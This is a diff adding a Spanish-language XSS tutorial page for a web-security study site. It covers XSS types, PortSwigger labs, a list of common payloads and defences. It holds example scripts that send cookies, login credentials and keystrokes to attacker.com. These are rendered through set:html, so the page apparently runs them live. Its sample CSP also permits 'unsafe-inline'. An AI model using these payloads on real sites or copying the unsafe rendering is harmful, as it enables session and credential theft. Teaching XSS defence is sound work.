@@ -1,0 +1,317 @@
+---
+import BaseLayout from "../../layouts/BaseLayout.astro";
+---
+<BaseLayout title="Cross-Site Scripting (XSS) - Web Security">
+  <div class="websec-container">
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/websecurity/">Web Security</a>
+      <span class="separator">→</span>
+      <span class="current">Cross-Site Scripting (XSS)</span>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="detail-hero">
+      <div class="hero-badge critical">
+        <span class="badge-icon">🔴</span>
+        OWASP Top 3
+      </div>
+      <h1 class="detail-title">
+        <span class="title-icon">⚡</span>
+        Cross-Site Scripting (XSS)
+      </h1>
+      <p class="detail-description">
+        Domina los ataques XSS: Reflected, Stored y DOM-based. Aprende a crear payloads efectivos 
+        y a implementar defensas robustas contra la inyección de scripts maliciosos.
+      </p>
+    </section>
+
+    <!-- Quick Stats -->
+    <div class="quick-stats">
+      <div class="stat-card">
+        <span class="stat-icon">📊</span>
+        <div>
+          <div class="stat-value">Severity</div>
+          <div class="stat-label">High</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <span class="stat-icon">🧪</span>
+        <div>
+          <div class="stat-value">2 Labs</div>
+          <div class="stat-label">PortSwigger</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <span class="stat-icon">⏱️</span>
+        <div>
+          <div class="stat-value">~2 horas</div>
+          <div class="stat-label">Tiempo estimado</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <span class="stat-icon">📈</span>
+        <div>
+          <div class="stat-value">Fácil</div>
+          <div class="stat-label">Dificultad</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Content Section -->
+    <div class="content-section">
+      <!-- Introduction -->
+      <div class="content-card">
+        <h2>
+          <span class="section-icon">📖</span>
+          ¿Qué es Cross-Site Scripting?
+        </h2>
+        <p>
+          Cross-Site Scripting (XSS) es una vulnerabilidad que permite a un atacante inyectar scripts 
+          maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios. Cuando la víctima 
+          carga la página comprometida, el script se ejecuta en su navegador con:
+        </p>
+        <ul class="feature-list">
+          <li><span class="list-icon">🍪</span> Acceso a cookies y tokens de sesión</li>
+          <li><span class="list-icon">🎭</span> Capacidad de realizar acciones en nombre del usuario</li>
+          <li><span class="list-icon">📝</span> Modificación del contenido de la página</li>
+          <li><span class="list-icon">🔑</span> Robo de credenciales mediante keylogging</li>
+        </ul>
+      </div>
+
+      <!-- Types -->
+      <div class="content-card">
+        <h2>
+          <span class="section-icon">🎯</span>
+          Tipos de XSS
+        </h2>
+        
+        <div class="type-grid">
+          <div class="type-card">
+            <div class="type-header">
+              <span class="type-icon">🔄</span>
+              <h3>Reflected XSS</h3>
+            </div>
+            <p>
+              El script malicioso se refleja inmediatamente en la respuesta del servidor. 
+              La víctima debe hacer clic en un enlace especialmente crafteado.
+            </p>
+            <div class="xss-example">
+              <code>https://site.com/search?q={'<script>alert(1)</script>'}</code>
+            </div>
+          </div>
+
+          <div class="type-card">
+            <div class="type-header">
+              <span class="type-icon">💾</span>
+              <h3>Stored XSS</h3>
+            </div>
+            <p>
+              El payload se almacena en el servidor (base de datos, comentarios, perfiles) 
+              y se ejecuta cada vez que alguien ve el contenido infectado.
+            </p>
+            <div class="type-subtypes">
+              <span class="subtype-tag danger">Más peligroso</span>
+              <span class="subtype-tag">Persistente</span>
+            </div>
+          </div>
+
+          <div class="type-card">
+            <div class="type-header">
+              <span class="type-icon">🌐</span>
+              <h3>DOM-based XSS</h3>
+            </div>
+            <p>
+              La vulnerabilidad existe en el código JavaScript del lado del cliente. 
+              El servidor nunca ve el payload malicioso.
+            </p>
+            <div class="type-subtypes">
+              <span class="subtype-tag">Client-side</span>
+              <span class="subtype-tag">Más difícil de detectar</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Example -->
+      <div class="content-card">
+        <h2>
+          <span class="section-icon">💻</span>
+          Ejemplos de Ataques
+        </h2>
+        
+        <div class="attack-scenarios">
+          <div class="scenario-card">
+            <h4>🍪 Cookie Stealing</h4>
+            <div class="code-example">
+              <pre><code set:html={`<script>
+  fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>`} /></pre>
+            </div>
+          </div>
+
+          <div class="scenario-card">
+            <h4>🎣 Phishing</h4>
+            <div class="code-example">
+              <pre><code set:html={`<script>
+  document.body.innerHTML = '<form action="https://attacker.com">
+    Login: <input name="user"><input type="password" name="pass">
+  </form>';
+</script>`} /></pre>
+            </div>
+          </div>
+
+          <div class="scenario-card">
+            <h4>⌨️ Keylogging</h4>
+            <div class="code-example">
+              <pre><code set:html={`<script>
+  document.addEventListener('keypress', function(e) {
+    fetch('https://attacker.com/log?key=' + e.key);
+  });
+</script>`} /></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Labs Section -->
+      <div class="content-card">
+        <h2>
+          <span class="section-icon">🧪</span>
+          Laboratorios Prácticos
+        </h2>
+        
+        <div class="labs-grid">
+          <a href="/WebSecurity/xss/PortSwigger/Lab1.html" class="lab-card">
+            <div class="lab-number">Lab 01</div>
+            <h3>Reflected XSS Básico</h3>
+            <p>Aprende a identificar y explotar Reflected XSS</p>
+            <div class="lab-meta">
+              <span class="lab-difficulty easy">Fácil</span>
+              <span class="lab-time">⏱️ 20 min</span>
+            </div>
+          </a>
+
+          <a href="/WebSecurity/xss/PortSwigger/Lab2.html" class="lab-card">
+            <div class="lab-number">Lab 02</div>
+            <h3>Stored XSS</h3>
+            <p>Explota XSS persistente en comentarios</p>
+            <div class="lab-meta">
+              <span class="lab-difficulty easy">Fácil</span>
+              <span class="lab-time">⏱️ 25 min</span>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- Common Payloads -->
+      <div class="content-card">
+        <h2>
+          <span class="section-icon">⚡</span>
+          Payloads Comunes
+        </h2>
+        <div class="payloads-grid">
+          <div class="payload-item">
+            <div class="payload-header">Básico</div>
+            <code set:html={'<script>alert(1)</script>'} />
+          </div>
+          <div class="payload-item">
+            <div class="payload-header">IMG Tag</div>
+            <code set:html={'<img src=x onerror=alert(1)>'} />
+          </div>
+          <div class="payload-item">
+            <div class="payload-header">SVG</div>
+            <code set:html={'<svg onload=alert(1)>'} />
+          </div>
+          <div class="payload-item">
+            <div class="payload-header">Evento</div>
+            <code set:html={'<body onload=alert(1)>'} />
+          </div>
+          <div class="payload-item">
+            <div class="payload-header">Iframe</div>
+            <code set:html={'<iframe src="javascript:alert(1)">'} />
+          </div>
+          <div class="payload-item">
+            <div class="payload-header">Base64</div>
+            <code set:html={'<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'} />
+          </div>
+        </div>
+      </div>
+
+      <!-- Prevention -->
+      <div class="content-card prevention-card">
+        <h2>
+          <span class="section-icon">🛡️</span>
+          Prevención y Mitigación
+        </h2>
+        <div class="prevention-grid">
+          <div class="prevention-item">
+            <span class="prevention-icon">✅</span>
+            <div>
+              <h4>Output Encoding</h4>
+              <p>Escapa todos los datos antes de renderizarlos en HTML</p>
+            </div>
+          </div>
+          <div class="prevention-item">
+            <span class="prevention-icon">✅</span>
+            <div>
+              <h4>Content Security Policy (CSP)</h4>
+              <p>Define políticas que restringen la ejecución de scripts</p>
+            </div>
+          </div>
+          <div class="prevention-item">
+            <span class="prevention-icon">✅</span>
+            <div>
+              <h4>HTTPOnly Cookies</h4>
+              <p>Marca cookies sensibles como HTTPOnly para prevenir acceso desde JS</p>
+            </div>
+          </div>
+          <div class="prevention-item">
+            <span class="prevention-icon">✅</span>
+            <div>
+              <h4>Input Validation</h4>
+              <p>Valida y sanitiza entrada del usuario en el servidor</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="csp-example">
+          <h4>Ejemplo de CSP Header:</h4>
+          <div class="code-example">
+            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- Resources -->
+      <div class="content-card resources-mini">
+        <h2>
+          <span class="section-icon">📚</span>
+          Recursos Adicionales
+        </h2>
+        <div class="resources-links">
+          <a href="/WebSecurity/xss/HackTheBox/Machine1.html" class="resource-link">
+            <span class="resource-emoji">🏴</span>
+            <span>HackTheBox XSS Challenges</span>
+          </a>
+          <a href="https://portswigger.net/web-security/cross-site-scripting" class="resource-link" target="_blank">
+            <span class="resource-emoji">🎓</span>
+            <span>PortSwigger XSS Academy</span>
+          </a>
+          <a href="https://owasp.org/www-community/attacks/xss/" class="resource-link" target="_blank">
+            <span class="resource-emoji">📖</span>
+            <span>OWASP XSS Guide</span>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Back Button -->
+    <div class="navigation-back">
+      <a href="/websecurity/" class="btn-back">
+        <span class="back-arrow">←</span>
+        Volver a Web Security
+      </a>
+    </div>
+  </div>
+</BaseLayout>
